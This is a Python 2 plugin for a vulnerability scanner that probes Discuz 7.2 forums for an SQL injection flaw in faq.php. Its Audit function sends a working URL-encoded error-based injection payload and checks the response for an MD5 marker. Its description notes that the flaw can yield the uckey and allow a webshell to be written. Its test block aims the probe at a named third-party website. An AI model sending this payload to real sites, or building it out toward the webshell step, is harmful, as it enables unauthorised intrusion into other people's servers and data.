#!/usr/bin/python2.7
#coding:utf-8

import urllib2
from dummy import *

info = {
	'NAME':'Discuz 7.2 faq.php SQL Injection',
	'AUTHOR':'seay,yangbh',
	'TIME':'20140730',
	'WEB':'',
	'DESCRIPTION':'discuz7.2 faq.php sql注入漏洞，可注入得到uckey直接写入webshell，详见http://www.cnseay.com/3967/'
}
opts = {
	'url':'http://testasp.vulnweb.com',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url'],
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'Discuz':
			if services.has_key('cmsversion') == False or \
				(services.has_key('cmsversion') and services['cmsversion'] == '7.2'):
				return True
	return False

def Audit(services):
	url = services['url'] +'/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28md5%281%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23'
	try:
		ul = urllib2.urlopen(url)
		content = ul.read()
		if content.find('c4ca4238a0b923820dcc509a6f75849b1') != -1:
			security_hole(url)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)